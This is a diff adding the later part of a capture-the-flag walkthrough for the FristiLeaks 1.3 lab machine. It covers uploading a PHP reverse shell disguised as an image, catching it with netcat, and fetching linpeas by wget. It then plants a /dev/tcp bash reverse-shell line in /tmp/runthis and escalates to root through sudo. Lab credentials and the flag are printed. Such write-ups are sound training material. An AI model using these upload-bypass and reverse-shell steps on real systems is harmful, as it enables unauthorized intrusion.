@@ -63,3 +63,83 @@ I created a file with the base64 text and ran the command `cat fristi.txt | base
 Here is the image we create:
 
 ![eezeepz password](/images/Fristileaks1-3/kekekePass.JPG)
+
+I used this as a password in the new login page we have
+
+eezeepz : keKkeKKeKKeKkEkkEk
+
+### File Upload
+
+`cp /usr/share/webshells/php/php-reverse-shell.php shell.php`
+
+Edit the shell to use your local IP and a port for netcat
+
+If we try and upload as is, we get an error because it only accepts image files
+
+There are lots of different ways to get around this but as this is an easy box, it's likely we don't need to do anything too complicated. We can just rename the file to shell.php.png and upload it like that.
+
+## Reverse Shell
+
+`nc -lvnp 4444` on local machine so we can connect back
+
+Navigate to <LHOST>/fristi/uploads/shell.php.png
+ 
+If we check the nc connection, we have a shell as the apache user
+
+Upgrade the shell using `python -c 'import pty; pty.spawn("/bin/sh")'`
+
+## Privilege Escalation to Admin
+
+`locate linpeas.sh` on your local machine and create a python web server in that directory `python3 -m http.server`
+
+`cd /tmp` and `wget http://<LHOST>:8000/linpeas.sh`
+
+`chmod 777 linpeas.sh`
+
+When we run it, it immediately flags the linux version as high risk.
+
+`searchsploit linux 2.6.32` and we find lots of scripts that have potential
+
+I spent a lot of time trying different scripts but couldn't get to work as intended. I went back to my linpeas output and saw that in `/var/www` there was a notes.txt file telling eezeepz to clean their home directory
+
+If we go to it, we can see it really is a mess with another notes.txt file
+
+This file essentially tells us that if we create a file called `runthis` in /tmp, we can run certain commands as admin
+
+We can use this to get a direct shell as the admin user
+
+`echo "/usr/bin/dir && /bin/bash -i >& bash -i >& /dev/tcp/<LHOST>/1234 0>&1" > /tmp/runthis`
+
+Start an nc listener `nc -lvnp 1234` and wait for the connection back
+
+## Privilege Escaltion to fristigod
+
+In /home/admin we find 2 encrypted passwords in the files: mVGZ3O3omkJLmy2pcuTq  and  =RFn0AKnlMHMPIzpyuTI0ITG
+
+There is also the python script explaining how they got encrypted:
+
+1. Base64 encode
+2. Reverse string
+3. rot13 encode
+
+Take one of the ciphertexts and decode using a rot13 cipher then paste that into this command on linux: `echo "ciphertext" | rev | base64 -d`
+
+We get thisisalsopw123   and   LetThereBeFristi!
+
+If we use these passwords on the various users, we find the creds:
+admin : thisisalsopw123 
+fristigod : LetThereBeFristi!
+
+## Privilege Escalation to root
+
+`sudo -l` and we can run /docom in /var/fristigod/.secret_admin_stuff
+
+If we try running doCom, it says we're the wrong user so lets try as someone else
+
+`sudo -u fristi ./doCom`
+
+But to says we have to included a terminal command as well
+
+`sudo -u fristi ./doCom /bin/bash`
+
+And now we're root and can read the secret file in root containing the flag: Flag: Y0u_kn0w_y0u_l0ve_fr1st1
